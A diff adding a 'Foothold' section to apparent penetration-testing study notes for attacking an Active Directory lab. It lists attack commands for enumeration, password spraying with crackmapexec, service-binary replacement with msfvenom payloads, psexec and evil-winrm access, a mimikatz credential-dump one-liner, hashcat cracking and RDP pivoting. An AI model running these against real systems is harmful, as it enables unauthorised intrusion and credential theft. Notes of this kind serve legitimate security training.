@@ -174,6 +174,50 @@ Active Directory Persistence
                - lsadump::dcsync /user:Administrator
                - you can change the user name
                
+ --------------------------------------------------------------------------------------------------------------------------------------------------
+ 
+Foothold: 
+
+- Nmap: nmap -sC -sV -T4 <IP> > int.txt
+  - Sometimes you will find ldap default password
+    - You can use the password to enumerate ldap and get usernames: ldapsearch -h <IP> -bx "DC=<>,DC=<>"
+    
+- Password Spray 
+  - If you have usernames and passwords you may try and bruteforce:
+    - cme smb <IP> -u user.txt -p 'passowrd'
+    - cme ssh <IP> -u user.txt -p 'passowrd'
+    - Note: try on all three machines and try to hit all services that take login creds. 
+    - Very likely you get a valid cred set and you can use it to ssh or rdp into the first machine
+
+- Privelge Escalation: 
+  - Use winpeas to locate insecure service executables, then use msfvenom to generate a payload to replace the exe file: 
+    - You can check manually: 
+      - accesschk.exe -uwcqv *
+      - accesschk.exe -uwcqv "Your group name" *
+      - A common example is printing services.
+    - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+    - shutdown /r /t 0 
+    
+  - Look for hardcoded password
+    - You can use found creds to enum smb shares: cme smb <IP> -u 'user' -p 'passowrd'
+    - You can login using psexec: PSExec.exe <domain>/<user>:<password>@<IP>
+    - You can use evil-winrm to get to domain controllers: evil-winrm -i <IP> -u <user> -p <password>
+    
+- Post compromise of the first machine: 
+  - Get mimikatz on the first machine
+    - One liner: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > passwords.txt
+    - Broken down:
+      - mimikatz.exe
+      - privilege::debug
+      - sekurlsa::logonpasswords
+      - exit
+  - Crack NTLM passwords
+    - hashcat hash.txt rockyou.txt
+    - hashcat --show 
+
+- Pivot from first machine to 2nd 
+  - xfreerdp /u:<username> /p:<password> /v:<IP>
+    
       
    
   
